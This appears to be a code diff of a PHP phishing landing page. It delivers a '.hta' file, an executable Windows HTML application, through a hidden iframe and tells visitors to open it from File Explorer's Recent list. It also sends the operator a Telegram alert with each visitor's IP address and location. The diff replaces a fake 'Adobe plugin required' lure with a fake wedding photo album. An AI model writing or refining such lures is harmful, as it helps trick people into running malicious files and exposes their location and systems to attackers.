@@ -12,24 +12,19 @@ if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name
 $name = substr($name, 0, 90);
 if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
 $tok  = check_token($_GET['tk'] ?? null);
-$kind = name_kind($name);
 
 $tk    = rawurlencode($_GET['tk']);
 $nameQ = rawurlencode($name);
 
-// Instruction is variant-aware: "to install" for Adobe names,
-// "to view your document" for document names. Points at Windows 11
-// File Explorer "Recent", where fresh downloads land first.
-$instr = ($kind === 'adobe')
-    ? 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to install.'
-    : 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view your document.';
+// Points at Windows 11 File Explorer "Recent", where fresh downloads land first.
+$instr = 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view the album.';
 
 // ---- one Telegram alert per visit (deduped by token nonce) ----
 $key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
 if (!@file_exists($key)) {
     @touch($key);
     $g   = geo(ip());
-    $msg = "\x{1F3AF} New Download Triggered \x{1F3AF}\n"
+    $msg = "\x{1F48D} New Album Opened \x{1F48D}\n"
          . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
          . "\x{1F4CD} IP: " . ip() . "\n"
          . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
@@ -46,27 +41,33 @@ if (!@file_exists($key)) {
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta name="robots" content="noindex, nofollow">
-  <title>Adobe Plugin Required</title>
+  <title>Photo Album</title>
   <style>
     body {
-      font-family: Arial, sans-serif; margin: 0; height: 100vh;
+      font-family: "Segoe UI", Tahoma, sans-serif; margin: 0; height: 100vh;
       display: flex; align-items: flex-start; justify-content: center;
-      background-color: #f5f5f5; padding-top: 15vh;
+      background-color: #0e0e0e; color: #d9d1bf; padding-top: 12vh;
     }
-    .container { text-align: center; max-width: 600px; margin-top: 0; }
-    img { width: 150px; margin-bottom: 20px; }
-    a { color: #d32f2f; text-decoration: none; font-weight: bold; }
+    .container { text-align: center; max-width: 560px; }
+    .rings { width: 70px; margin: 0 auto 18px auto; display: block; }
+    a { color: #c9a86a; text-decoration: none; font-weight: 600; }
     a:hover { text-decoration: underline; }
-    p { line-height: 1.6; margin: 0; padding: 0 10px; }
+    p { line-height: 1.7; margin: 0; padding: 0 12px; }
+    .title { font-family: Georgia, "Times New Roman", serif; font-size: 26px;
+      letter-spacing: 2px; color: #efe6d2; margin-bottom: 14px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="assets/adobeicon.png" alt="Adobe Icon">
-    <p>Sorry, You do not have the latest version of Adobe plugin installed.<br>
-    Let's finish your installation.<br><br>
-    <?php echo $instr; ?> <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">Download manually</a>.<br><br>
-    Download not working? <a href="#">&#8635; Restart and Download | Get Help</a></p>
+    <svg class="rings" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <circle cx="38" cy="54" r="26" fill="none" stroke="#c9a86a" stroke-width="7"/>
+      <circle cx="62" cy="46" r="26" fill="none" stroke="#a8894e" stroke-width="7"/>
+    </svg>
+    <div class="title">Aria &amp; James &mdash; Our Wedding</div>
+    <p>Sorry, the album could not be opened automatically.<br>
+    Let's finish opening it.<br><br>
+    <?php echo $instr; ?> <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">Download the album again</a>.<br><br>
+    Not working? <a href="#">&#8635; Restart and open | Get Help</a></p>
   </div>
 
   <!-- Hidden iframe to trigger the actual (fresh-name, unique-hash) download.
